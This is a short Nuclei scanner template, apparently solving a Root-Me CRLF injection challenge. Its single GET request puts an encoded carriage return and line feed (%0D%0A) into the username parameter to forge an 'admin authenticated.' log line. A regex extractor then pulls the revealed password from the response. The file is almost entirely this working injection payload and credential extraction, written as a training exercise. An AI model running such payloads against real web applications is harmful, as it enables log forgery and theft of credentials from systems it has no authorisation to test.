id: CRLF
info:
  author: Tomitom13
  name: CRLF
  severity: unknown
  tags: clrf,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - 'password : [a-zA-Z0-9!@#$%^&*()_+,.<>?]+'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - 'password : '
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}index.php?username=admin%20authenticated.%0D%0AMeyo&password=n''importe-quoi'
